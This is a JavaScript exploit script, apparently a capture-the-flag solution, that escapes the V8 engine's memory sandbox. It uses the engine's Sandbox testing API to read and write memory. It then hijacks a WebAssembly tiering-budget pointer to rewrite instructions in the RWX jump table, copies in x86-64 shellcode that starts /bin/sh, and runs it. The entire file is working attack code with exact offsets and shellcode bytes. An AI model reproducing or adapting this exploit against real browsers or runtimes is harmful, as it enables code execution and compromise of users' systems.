var wasm_code = new Uint8Array([
  //{{WASM}}
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var { shell, arb_write, nop, nop2 } = wasm_instance.exports;

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
  return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
  return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
  return sandboxMemory.setBigInt64(Number(addr), val, true);
}

function pwn() {
  // compile functions
  nop();
  nop2();
  arb_write(0, 10n);
  shell();

  let shr_instruction_off = 0x99cn;
  let sub_instruction_off = 0x8f6n;
  let add_instruction_off = 0x9a0n;
  let js_instruction_off = 0x8fbn;
  let shellcode_off = 0xa92n;
  let tiering_budget_array_off = 0x77n + 1n;

  let wasm_instance_addr = BigInt(addrOf(wasm_instance));
  console.log("[*] wasm instance: 0x" + wasm_instance_addr.toString(16));

  let jump_table_start = v8_read64(wasm_instance_addr + 0x48n);
  let shr_instruction_addr = jump_table_start + shr_instruction_off;
  let sub_instruction_addr = jump_table_start + sub_instruction_off + 4n;
  let add_instruction_addr = jump_table_start + add_instruction_off;
  let js_instruction_addr = jump_table_start + js_instruction_off;
  let shellcode_addr = jump_table_start + shellcode_off;

  console.log("[*] RWX start: 0x" + jump_table_start.toString(16));
  console.log("[*] Shr instruction addr: 0x" + shr_instruction_addr.toString(16));
  console.log("[*] Sub instruction addr: 0x" + sub_instruction_addr.toString(16));
  console.log("[*] Add instruction addr: 0x" + add_instruction_addr.toString(16));
  let orig_sub_addr = v8_read64(wasm_instance_addr + tiering_budget_array_off);

  v8_write64(wasm_instance_addr + tiering_budget_array_off, sub_instruction_addr);
  nop(); // transform "subl rdx,0x32" in "subl rdi,0x1a"
  nop(); // transform "subl rdx,0x1a" in "subl rdi,0x2"

  v8_write64(wasm_instance_addr + tiering_budget_array_off, js_instruction_addr - 4n + 1n);
  nop2(); // transform "js 0x3d" in "jbe 0x3d"

  v8_write64(wasm_instance_addr + tiering_budget_array_off, shr_instruction_addr - 4n + 3n);
  for (let _ = 0; _ < 12; _++) {
    nop2(); // transform "shrq rcx, 24" in "shrq rcx, 0"
  }

  v8_write64(wasm_instance_addr + tiering_budget_array_off, add_instruction_addr - 4n);
  nop2(); // transform "addq rcx,r14" in "add r9d, r14d

  v8_write64(wasm_instance_addr + tiering_budget_array_off, orig_sub_addr);
  const shellcode = [
    0x732f6e69622fb848n, 0x66525f5450990068n, 0x5e8525e54632d68n, 0x68736162000000n, 0xf583b6a5e545756n, 0x5n
  ];

  console.log("[+] Copying shellcode")
  v8_write64(wasm_instance_addr + 0x28n, shellcode_addr);
  shellcode.map((code, i) => {
    arb_write(i * 8, code);
  })

  console.log("[+] Poping shell!!!")
  shell();
}

// pwn();
